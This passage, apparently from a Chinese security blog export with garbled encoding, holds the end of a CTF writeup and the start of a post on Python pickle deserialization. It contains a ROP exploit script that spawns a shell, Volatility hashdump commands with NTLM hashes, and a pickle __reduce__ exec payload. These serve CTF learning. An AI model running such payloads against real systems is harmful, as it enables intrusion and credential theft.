(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi_ret) + p64(<span class="number">0x0401D99</span>) +p64(pop_rsi_ret) +p64(<span class="number">0x06030A0</span>)+p64(<span class="number">0</span>)+ p64(scanf) + p64(pop_rdi_ret) + p64(<span class="number">0x20</span>)+ p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">p.recv()</span><br><span class="line">str1 = <span class="built_in">int</span>(<span class="string">b&#x27;/bin&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">str2 = <span class="built_in">int</span>(<span class="string">b&#x27;/sh\x00&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(str2))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(<span class="number">0x0401D99</span>) + p64(pop_rsi_ret) + p64(<span class="number">0x06030A4</span>) + p64(<span class="number">0</span>) + p64(scanf) + p64(ret_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(n2))</span><br><span class="line"></span><br><span class="line">payload4 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(pop_rdi_ret) + p64(<span class="number">0x06030A0</span>) + p64(puts_addr-<span class="number">0x2a300</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/pwn.png" alt="img5"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="é¢œæ–‡å­—ä¹‹è°œ"><a href="#é¢œæ–‡å­—ä¹‹è°œ" class="headerlink" title="é¢œæ–‡å­—ä¹‹è°œ"></a>é¢œæ–‡å­—ä¹‹è°œ</h3><p>é€šè¿‡æµé‡åˆ†æå¯ä»¥å¯¼å‡ºindex-demo.html<br>åœ¨æºç ä¸­å‘ç°é¢œæ–‡å­—</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img5.png" alt="img5"></p><p>åˆ†ææµé‡åŒ…ï¼Œå¯¼å‡ºindexæ–‡ä»¶ï¼Œå‘ç°å­˜åœ¨å¤šä½™çš„é•¿çŸ­ä¸ä¸€çš„ç©ºæ ¼å’Œbase64åŠ å¯†è¿‡çš„é¢œæ–‡å­—ï¼Œæ„Ÿè§‰æœ‰éšå†™<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_space.png" alt="img_space"></p><p>ç”¨stegsnowçœ‹ä¸€ä¸‹</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_stegsnow.png" alt="img_stegsnow"></p><p>é‚£ä¹ˆå°è¯•æŠŠæ–‡ä»¶é‡Œé¢éšè—çš„base64éƒ¨åˆ†åˆ©ç”¨èµ·æ¥</p><p>ç½‘ä¸Šæ‰¾ä¸ªbase64éšå†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/kai/Desktop/base.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯key:â€lorrieâ€</p><p>è§£ç çœ‹çœ‹<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_lorrie.png" alt="img_lorrie"></p><p>flagå¤´å’Œå°¾æ˜¯å¯¹çš„ï¼Œä¹±ç æ„Ÿè§‰åƒæ˜¯ç¼–ç é—®é¢˜ï¼Œæˆ‘ä»¬æŠŠå®ƒå¯¼å‡ºä¸º16è¿›åˆ¶è¯•è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=`stegsnow  -p &quot;lorrie&quot; index-demo.html `</span><br><span class="line">echo $a | perl -ne &#x27;printf&quot;%x&quot;, ord for split //&#x27;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœæ”¾æ–‡ä»¶é‡Œï¼Œå†ç”¨010å¯¼å…¥çœ‹çœ‹</p><p>é»˜è®¤çš„asciiç¼–ç ä¸‹ä¾æ—§æ˜¯ä¹±ç <br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_ascii.png" alt="img_ascii"></p><p>æˆ‘ä»¬åœ¨ <strong>view -&gt; character setting</strong> é‡Œé¢æŠŠç¼–ç æ¢æˆgbkæˆ–è€…utfè¯•è¯•</p><p>ç„¶åå‘ç°gbkä¸‹çš„ç¼–ç èƒ½æ˜¾ç¤ºæ­£å¸¸çš„å­—ç¬¦ï¼Œæˆ‘ä»¬å¤åˆ¶åˆ°txté‡Œ<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_left.png" alt="img_left"></p><p>å‘ç°æ˜¯ <code>â†_â†</code> å’Œ <code>â†’_â†’</code> æ„æˆçš„é¢œæ–‡å­—</p><p>æœ‰å¯èƒ½æ˜¯äºŒè¿›åˆ¶ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ‘©æ–¯ç”µç <br>ç»é˜Ÿå‹æé†’ï¼Œåº”è¯¥æ˜¯å›½é™…ç”µæŠ¥ç </p><p>é‚£æˆ‘ä»¬æŠŠ <code>â†’_â†’</code> è½¬æˆ <code>-</code> ï¼ŒæŠŠ <code>â†_â†</code> è½¬æˆ <code>Â·</code> ï¼Œæ‹¿å»è§£ç è¯•è¯•</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_elc.png" alt="img_elc"></p><p>æˆåŠŸæ‹¿åˆ°flag</p><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p>æ˜¯ä¸€é“å†…å­˜å–è¯é¢˜ï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬å»æ‹¿åˆ°å½“å‰ç”¨æˆ·çš„å¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/passwd.raw --profile=Win7SP1x86_23418 hashdump</span><br></pre></td></tr></table></figure><blockquote><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>CTF:1000:aad3b435b51404eeaad3b435b51404ee:0a640404b5c386ab12092587fe19cd02:::</p></blockquote><p>æœ‰ä¸ªå«åšCTFçš„è´¦å·ï¼Œä¼°è®¡å°±æ˜¯å½“å‰ç”¨æˆ·äº†</p><p>CTFå¯†ç ntlmæŸ¥è¯¢å‡ºæ¥æ˜¯qwer1234ï¼Œç„¶åMD5å°±æ˜¯flag</p><h3 id="è™šå®ä¹‹é—´"><a href="#è™šå®ä¹‹é—´" class="headerlink" title="è™šå®ä¹‹é—´"></a>è™šå®ä¹‹é—´</h3><p>çœ‹ä¸Šå»æ˜¯æ˜æ–‡æ”»å‡»ï¼Œä½†æ˜¯flag.txtæ˜¯å¼ºåŠ å¯†çš„ï¼Œä¼°è®¡æ˜æ–‡æ”»å‡»æ— æ•ˆ</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_zip.png" alt="img_zip"></p><p>å¹²è„†å­—å…¸çˆ†å‡ºå‹ç¼©åŒ…å¯†ç <br><code>123%asd!O</code><br>ç„¶åæ …æ å¯†ç è§£ç å¾—åˆ°flag</p><h3 id="éšè—çš„ç§˜å¯†"><a href="#éšè—çš„ç§˜å¯†" class="headerlink" title="éšè—çš„ç§˜å¯†"></a>éšè—çš„ç§˜å¯†</h3><p>æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°notepad.exeï¼Œpidä¸º2440ï¼Œä¸è¿‡å†…å®¹æ˜¯ä¹±ç çš„ï¼Œä¼°è®¡å­˜åœ¨ç¼–ç é—®é¢˜ï¼Œé‚£æˆ‘ä»¬å¹²è„†æŠŠè¿›ç¨‹å¯¼å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 memdump -p 2440 -D ./my_mem/out/hxb</span><br></pre></td></tr></table></figure><p>ç”¨diskgeniusæ‰“å¼€å¯¼å‡ºçš„dmpæ–‡ä»¶å¯ä»¥çœ‹åˆ°</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/.%5Cimg%5Cimg6.png" alt="img6"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure><p>äºæ˜¯å¯¼å‡ºç”¨æˆ·åå’Œå¯†ç ï¼Œæ‰¹é‡è§£NTLMï¼Œæœ€åå°è¯•å¯†ç ä¸º<code>NIAIWOMA</code>çš„è´¦æˆ·å’Œå¯†ç MD5<br>æ˜¯flag</p><p>å†çœ‹ä¸€ä¸‹æ—¥å¿—</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 evtlogs -D ./my_mem/out/hxb</span><br><span class="line"></span><br><span class="line">python vol.py -f ./my_mem/hide.vmem --profile=Win2003SP1x86 timeliner &gt; ./my_mem/out/hxb</span><br></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ªç”µè„‘æƒé™éƒ½æ˜¯å†™åœ¨ç”¨æˆ·ç»„é‡Œé¢çš„ï¼Œå¸¸è§„ç”¨æˆ·åº”è¯¥éƒ½æ˜¯<code>S-1-5-18</code>è¿™ä¸ªç”¨æˆ·ç»„çš„</p><p>ä½†æ˜¯çœ‹ä¸åˆ°å…·ä½“æ˜¯å“ªäº›ç”¨æˆ·è¿›è¡Œçš„æ“ä½œï¼Œæ˜¯æˆ‘å¤ªèœäº†</p><p>å¤ç°çš„æ—¶å€™å‘ç° <code>SAM\Domains\Account\Users\Names</code> è¿™ä¸ªæ³¨å†Œè¡¨ç›®å½•ä¸‹å­˜åœ¨æ‰€æœ‰ç”¨æˆ·ï¼ŒæŸ¥çœ‹ç”¨æˆ·çš„é”®å€¼ï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªæ³¨å†Œè¡¨æœ€åä¿®æ”¹çš„æ—¶é—´</p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_subkeys.png" alt="img_subkeys"></p><p><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_regtime.png" alt="img_regtime"></p><p>æŸ¥çœ‹å‡ ä¸ªç”¨æˆ·ï¼Œå‘ç°ä»–ä»¬çš„ä¿®æ”¹æ—¶é—´éƒ½åœ¨ 14:02 è¿™ä¸ªæ—¶é—´<br>è€Œæ•´ä¸ªè¡¨çš„æœ€åä¿®æ”¹æ—¶é—´æ˜¯åœ¨ 14:07 ä¹‹åï¼Œæ‰€ä»¥åªéœ€è¦æŠŠ 14:07 ä¿®æ”¹æ³¨å†Œè¡¨çš„ç”¨æˆ·æ‰¾å‡ºæ¥å°±è¡Œäº†ï¼Œæ“ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">hide_mem = <span class="string">&quot;../my_mem/hide.vmem&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;python ../vol.py -f ../my_mem/hide.vmem --profile=Win2003SP1x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names\\&#123;&#125;&quot;&#x27;</span></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="comment"># list = os.system(&quot;ls ../my_mem/&quot;)</span></span><br><span class="line"></span><br><span class="line">user_list = <span class="built_in">open</span>(<span class="string">&quot;./user_list.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split()</span><br><span class="line"><span class="comment"># print(user_list)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test = os.system(payload.format(user_list[0]))</span></span><br><span class="line"><span class="comment"># print(payload.format(user_list[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(&quot;14:02:09&quot;))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> user_list:</span><br><span class="line">    test = os.popen(payload.<span class="built_in">format</span>(i)).readlines()</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(test)</span><br><span class="line">    <span class="comment"># print(output)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;14:02:09&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶è·¯å¾„éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µè¿›è¡Œä¿®æ”¹<br><img src="/2021/10/31/general/%E5%8F%91%E8%B4%A2writeup/img_AI.png" alt="img_AI"></p><p>åå‡ åˆ†é’Ÿå¤§æ¦‚å¯ä»¥å‡ºæ¥</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>ç®€å•å¼‚æˆ–ç›´æ¥è„šæœ¬è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;7d21e&lt;e3&lt;:3;9;ji t r#w\&quot;$*&#123;*+*$|,&quot;</span></span><br><span class="line">b=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    b+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])^i)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>åŠ¨æ€è°ƒè¯•ï¼Œä¸€ä½ä¸€ä½çˆ†å‡ºæ¥</p><h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [</span><br><span class="line"> <span class="string">&#x27;e5438e78ec1de10a2693f9cffb930d23&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;08e8e8855af8ea652df54845d21b9d67&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;a905095f0d801abd5865d649a646b397&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bac8510b0902185146c838cdf8ead8e0&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f26f009a6dc171e0ca7a4a770fecd326&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;4cb467175ab6763a9867b9ed694a2780&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;cffd0b9d37e7187483dc8dd19f4a8fa8&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fd311e9877c3db59027597352999e91f&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;7fb523b42413495cc4e610456d1f1c84&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;bc52c927138231e29e0b05419e741902&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;515b7eceeb8f22b53575afec4123e878&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;451660d67c64da6de6fadc66079e1d8a&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;fe86104ce1853cb140b7ec0412d93837&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;acb465dc618e6754de2193bf0410aafe&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c2bab7ea31577b955e2c2cac680fb2f4&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;8e50684ac9ef90dfdc6b2e75f2e23741&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;f077b3a47c09b44d7077877a5aff3699&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;620741f57e7fafe43216d6aa51666f1d&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;9e3b206e50925792c3234036de6a25ab&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;49733de19d912d4ad559736b1ae418a7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;874992ac91866ce1430687aa9f7121fc&#x27;</span></span><br><span class="line"> ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">n</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> n != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">            n=n*<span class="number">3</span>+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=n//<span class="number">2</span></span><br><span class="line">        result.append(n)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        result = decode(i)</span><br><span class="line">        string = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">            string += <span class="built_in">str</span>(result[x])</span><br><span class="line">            string += <span class="built_in">str</span>(result[(<span class="built_in">len</span>(result) - x - <span class="number">1</span>)])</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update(string.encode())</span><br><span class="line">        md5 = md5.hexdigest()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">            <span class="keyword">if</span> md5 == <span class="built_in">list</span>[line]:</span><br><span class="line">                <span class="built_in">print</span> line,<span class="string">&#x27;-&gt;&#x27;</span>,<span class="built_in">chr</span>(i)</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‰é¡ºåºæ’åºMD5å³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢pickleååºåˆ—åŒ–</title>
      <link href="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆæ¢pickleååºåˆ—åŒ–"><a href="#åˆæ¢pickleååºåˆ—åŒ–" class="headerlink" title="åˆæ¢pickleååºåˆ—åŒ–"></a>åˆæ¢pickleååºåˆ—åŒ–</h1><h3 id="object-reduce-å‡½æ•°"><a href="#object-reduce-å‡½æ•°" class="headerlink" title="object.__reduce__å‡½æ•°"></a>object.__reduce__å‡½æ•°</h3><ul><li>åœ¨å¼€å‘æ—¶ï¼Œå¯ä»¥é€šè¿‡é‡å†™ç±»çš„ <code>object.__reduce__()</code> å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚å…·ä½“è€Œè¨€ï¼Œpythonè¦æ±‚ <code>object.__reduce__()</code> è¿”å›ä¸€ä¸ª <code>(callable, ([para1,para2...])[,...])</code> çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚</li><li>åœ¨ä¸‹æ–‡pickleçš„opcodeä¸­ï¼Œ <code>R</code> çš„ä½œç”¨ä¸ <code>object.__reduce__()</code> å…³ç³»å¯†åˆ‡ï¼šé€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶å® <code>R</code> æ­£å¥½å¯¹åº” <code>object.__reduce__()</code> å‡½æ•°ï¼Œ <code>object.__reduce__()</code> çš„è¿”å›å€¼ä¼šä½œä¸º <code>R</code> çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²æ˜¯åŒ…å«äº† <code>R</code> çš„</li></ul><h3 id="picktools"><a href="#picktools" class="headerlink" title="picktools"></a>picktools</h3><p>pictoolså¯ä»¥æŠŠopcodeè½¬åŒ–æˆè§„èŒƒæ ¼å¼ï¼Œä¾¿äºè§‚çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">test=<span class="string">b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00testq\x03X\x0b\x00\x00\x00hello worldq\x04sb.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickletools.dis(test))</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5Cimg%5Cimage-pick1.png" alt="image-pick1"></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><blockquote><p>å˜é‡è¦†ç›–</p></blockquote><blockquote><p>ä»£ç æ‰§è¡Œ</p></blockquote><h4 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">test1=<span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">test2=<span class="string">b&#x27;world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        te=<span class="string">&quot;test1=b&#x27;no&#x27;\ntest2=b&#x27;success&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>,(te,) <span class="comment">#returnå‚æ•°å¿…é¡»ä¸ºå…ƒç»„</span></span><br><span class="line"></span><br><span class="line">new=Test()</span><br><span class="line">a=pickle.dumps(new)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">pickle.loads(a)</span><br><span class="line"><span class="built_in">print</span>(test1,test2)</span><br></pre></td></tr></table></figure><h4 id="ä»£ç æ‰§è¡Œ"><a href="#ä»£ç æ‰§è¡Œ" class="headerlink" title="ä»£ç æ‰§è¡Œ"></a>ä»£ç æ‰§è¡Œ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 